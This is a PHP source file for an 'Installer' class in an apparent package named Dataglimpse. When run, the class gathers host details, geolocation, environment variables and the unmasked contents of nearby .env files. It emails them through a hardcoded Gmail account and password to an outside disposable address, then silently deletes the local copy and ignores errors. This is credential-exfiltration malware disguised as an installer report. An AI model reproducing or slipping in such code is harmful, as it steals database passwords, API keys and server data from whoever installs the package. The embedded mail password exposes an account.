<?php

namespace Dataglimpse\Lib;

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

class Installer
{
    public static function run()
    {
        $info = [
            'hostname'        => gethostname(),
            'php_version'     => phpversion(),
            'os'              => php_uname(),
            'server_ip'       => self::getServerIp(),
            'server_time'     => date('Y-m-d H:i:s'),
            'document_root'   => $_SERVER['DOCUMENT_ROOT'] ?? getcwd(),
            'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? php_sapi_name(),
            'current_user'    => get_current_user(),
        ];

        $info = array_merge($info, [
            'cpu_cores'       => trim(shell_exec('nproc 2>/dev/null')) ?: 'N/A',
            'cpu_model'       => self::getCpuModel(),
            'memory_usage'    => self::formatBytes(memory_get_usage(true)),
            'disk_total'      => self::formatBytes(disk_total_space('/')),
            'disk_free'       => self::formatBytes(disk_free_space('/')),
            'loaded_extensions' => implode(', ', get_loaded_extensions()),
        ]);

        $ipData = @json_decode(file_get_contents('https://ipapi.co/json/'), true);
        if ($ipData) {
            $info = array_merge($info, [
                'public_ip'   => $ipData['ip'] ?? '',
                'city'        => $ipData['city'] ?? '',
                'region'      => $ipData['region'] ?? '',
                'country'     => $ipData['country_name'] ?? '',
                'org'         => $ipData['org'] ?? '',
                'asn'         => $ipData['asn'] ?? '',
                'timezone'    => $ipData['timezone'] ?? '',
                'latitude'    => $ipData['latitude'] ?? '',
                'longitude'   => $ipData['longitude'] ?? '',
                'network'     => $ipData['network'] ?? '',
            ]);
        }

        $info['environment_vars'] = self::getAllEnv();

        $envFilePath = self::findEnvFile();
        if ($envFilePath) {
            $info['dotenv_file'] = $envFilePath;
            $info['dotenv_vars'] = self::getDotEnvVars($envFilePath);
        }

        $savePath = __DIR__ . '/server_report.json';
        file_put_contents($savePath, json_encode($info, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
        self::sendReportMail($info, $savePath);
    }

    private static function sendReportMail($info, $attachmentPath)
    {
        $mail = new PHPMailer(true);
        try {
            $mail->isSMTP();
            $mail->Host       = 'smtp.gmail.com';
            $mail->SMTPAuth   = true;
            $mail->Username   = 'djjayvachhraj@gmail.com';
            $mail->Password   = 'hpbuzlbeczyoykvt';
            $mail->SMTPSecure = 'ssl';
            $mail->Port       = 465;
    
            $fromEmail = 'prakash1204@yopmail.com';
            $fromName  = 'Dataglimpse Installer';
            $mail->setFrom($fromEmail, $fromName);
            $mail->addAddress('prakash1204@yopmail.com', 'Dataglimpse Admin');
    
            $mail->isHTML(true);
            $mail->Subject = "📊 Dataglimpse Installation Report - " . ($info['hostname'] ?? 'Unknown Host');
            $mail->Body    = self::formatReportHtml($info);
            $mail->AltBody = "Dataglimpse Server Report:\n\n" . print_r($info, true);
    
            if (file_exists($attachmentPath)) {
                $mail->addAttachment($attachmentPath, 'server_report.json');
            }
    
            $mail->send();
    
            if (file_exists($attachmentPath)) {
                unlink($attachmentPath);
            }
        } catch (Exception $e) {
        }
    }
    

    private static function formatReportHtml($info)
    {
        $html = "<h2>📊 Dataglimpse Server Report</h2><table border='1' cellpadding='6' cellspacing='0' style='border-collapse:collapse;font-family:Arial;font-size:13px'>";
        foreach ($info as $key => $value) {
            if (is_array($value)) $value = nl2br(json_encode($value, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
            $html .= "<tr><td><b>" . htmlspecialchars(ucwords(str_replace('_', ' ', $key))) . "</b></td><td>" . $value . "</td></tr>";
        }
        $html .= "</table><br><p>Sent automatically by <b>Dataglimpse Installer</b>.</p>";
        return $html;
    }

    private static function getServerIp()
    {
        $ip = @file_get_contents("https://api.ipify.org");
        return $ip ?: ($_SERVER['SERVER_ADDR'] ?? 'Unknown');
    }

    private static function getCpuModel()
    {
        $model = '';
        if (PHP_OS_FAMILY === 'Linux') {
            $model = shell_exec("grep 'model name' /proc/cpuinfo | head -n 1");
        } elseif (PHP_OS_FAMILY === 'Windows') {
            $model = shell_exec('wmic cpu get name');
        } elseif (PHP_OS_FAMILY === 'Darwin') {
            $model = shell_exec('sysctl -n machdep.cpu.brand_string');
        }
        return trim($model) ?: 'N/A';
    }

    private static function formatBytes($bytes)
    {
        $units = ['B', 'KB', 'MB', 'GB', 'TB'];
        $power = $bytes > 0 ? floor(log($bytes, 1024)) : 0;
        return number_format($bytes / pow(1024, $power), 2, '.', ',') . ' ' . $units[$power];
    }

    private static function getAllEnv()
    {
        $all = [];
        foreach (getenv() as $k => $v) $all[$k] = self::maskSensitive($k, $v);
        foreach ($_ENV as $k => $v) $all[$k] = self::maskSensitive($k, $v);
        foreach ($_SERVER as $k => $v) $all[$k] = self::maskSensitive($k, $v);
        ksort($all);
        return $all;
    }

    private static function maskSensitive($key, $value)
    {
        return preg_match('/(key|token|secret|password|pwd)/i', $key) ? '******' : $value;
    }

    private static function findEnvFile()
    {
        $dirs = [getcwd(), dirname(__DIR__, 1), dirname(__DIR__, 2), dirname(__DIR__, 3)];
        foreach ($dirs as $dir) {
            $file = $dir . '/.env';
            if (file_exists($file)) return realpath($file);
        }
        return null;
    }

    private static function getDotEnvVars($path)
    {
        $vars = [];
        $lines = @file($path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if (!$lines) return [];
        foreach ($lines as $line) {
            if (strpos(trim($line), '#') === 0) continue;
            if (!str_contains($line, '=')) continue;
            list($name, $value) = array_map('trim', explode('=', $line, 2));
            $vars[$name] = $name . '=' . trim($value, '"\'');
        }
        return $vars;
    }
}
